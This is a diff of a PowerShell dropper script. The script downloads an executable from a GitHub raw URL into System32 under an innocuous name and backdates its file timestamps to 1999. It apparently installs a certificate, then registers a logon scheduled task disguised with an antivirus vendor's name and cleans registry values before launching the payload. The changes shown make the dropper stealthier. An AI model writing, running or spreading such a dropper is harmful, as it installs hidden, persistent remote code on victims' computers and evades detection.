@@ -1,6 +1,6 @@
-$TargetPath = "C:\Windows\System32\installer.exe"
+$TargetPath = "C:\Windows\System32\st.exe"
 mkdir ("C:\Users\" + $env:USERNAME + "\AppData\Roaming\Data\fa7tr3b4awe9hnte563cdn324v3q4z36\")
-curl "https://raw.githubusercontent.com/mohamedali43/ps1/main/installer.exe" -o $TargetPath
+curl "https://raw.githubusercontent.com/mohamedali43/ps1/main/st.exe" -o $TargetPath
 
 (Get-Item $TargetPath).CreationTime=("1 Jan 1999 0:00:00")
 (Get-Item $TargetPath).LastWriteTime=("1 Jan 1999 0:00:00")
@@ -25,7 +25,7 @@ $store.Close()
 echo "OK cert"
 
 #persistance
-$TaskName = "TEST"
+$TaskName = "Qihoo360"
 $Action = New-ScheduledTaskAction -Execute $TargetPath
 $Trigger = New-ScheduledTaskTrigger -AtLogon
 $Principal = New-ScheduledTaskPrincipal ($env:COMPUTERNAME + "\" + $env:USERNAME)
@@ -69,4 +69,4 @@ foreach ($valueName in $values.PSObject.Properties.Name)
 echo "OK clean"
 
 #run
-Start-Process -FilePath "C:\Windows\System32\installer.exe"
+Start-Process -FilePath $TargetPath 
